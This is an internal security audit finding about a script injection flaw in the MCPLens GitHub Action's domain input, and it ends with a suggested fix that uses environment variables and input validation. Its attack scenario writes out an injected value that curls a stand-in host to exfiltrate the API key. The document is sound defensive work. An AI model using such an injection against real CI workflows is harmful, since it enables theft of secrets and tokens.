---
id: 027
type: security
severity: high
status: new
found: 2026-03-25
phase: audit
---

## GitHub Action has script injection vulnerability via domain input

**What:** The MCPLens GitHub Action (`action.yml`) interpolates `${{ inputs.domain }}` directly into a bash script at lines 41, 51, 58, 67, 68, 77, 84, 87. This is a well-known GitHub Actions script injection pattern — if the `domain` input contains shell metacharacters like `"; malicious_command; echo "`, it breaks out of the bash string and executes arbitrary commands in the CI runner's context.

**Where:** `.github/actions/scan/action.yml` — lines 41, 51, 58

**Evidence:**

The vulnerable pattern:
```yaml
# Line 41 — direct interpolation into bash
DOMAIN="${{ inputs.domain }}"

# Line 51 — interpolated into curl body
-d "{\"domain\": \"$DOMAIN\"}")

# Line 77 — interpolated into GITHUB_STEP_SUMMARY (HTML injection)
echo "| **Domain** | \`$DOMAIN\` |" >> $GITHUB_STEP_SUMMARY
```

Attack scenario:
1. A CI workflow uses this action with `domain: ${{ github.event.inputs.domain }}` or any user-controlled input
2. Attacker submits domain: `"; curl https://evil.com/exfil?token=$MCPLENS_API_KEY; echo "`
3. The shell expands to: `DOMAIN=""; curl https://evil.com/exfil?token=$MCPLENS_API_KEY; echo ""`
4. The attacker's curl command runs in the CI context, potentially exfiltrating the API key, GitHub token, or other secrets

Even without an attacker, a domain containing `$`, backticks, or `"` would break the script silently.

GitHub's own documentation warns against this pattern: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections

**Why this matters:** The GitHub Action is MCPLens's CI/CD integration — a key Pro feature and the strongest retention hook. If a security researcher finds this injection, they'll report it publicly (GitHub Actions vulnerabilities are commonly disclosed), which would embarrass MCPLens and erode trust with exactly the developer audience that's most valuable. For the CI/CD integration to be credible as a production tool, it needs to handle inputs safely.

This is especially important because the Action accepts an `api-key` input (line 15-16) which is often stored as a GitHub secret. If the domain input can execute arbitrary commands, an attacker could exfiltrate the API key.

**Suggested Fix:** Use environment variables instead of direct interpolation:

```yaml
- name: Run MCPLens scan
  id: scan
  shell: bash
  env:
    MCPLENS_API_KEY: ${{ inputs.api-key }}
    INPUT_DOMAIN: ${{ inputs.domain }}
    INPUT_FAIL_UNDER: ${{ inputs.fail-under }}
  run: |
    # Use env vars (safe) instead of ${{ }} (injectable)
    DOMAIN="$INPUT_DOMAIN"
    FAIL_UNDER="$INPUT_FAIL_UNDER"

    # Validate domain format
    if ! echo "$DOMAIN" | grep -qE '^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'; then
      echo "::error::Invalid domain format: $DOMAIN"
      exit 1
    fi

    # ... rest of script uses $DOMAIN (from env, safe)
```

This moves the inputs into environment variables (set by GitHub's YAML engine, which handles them safely) and adds a domain format validation regex.
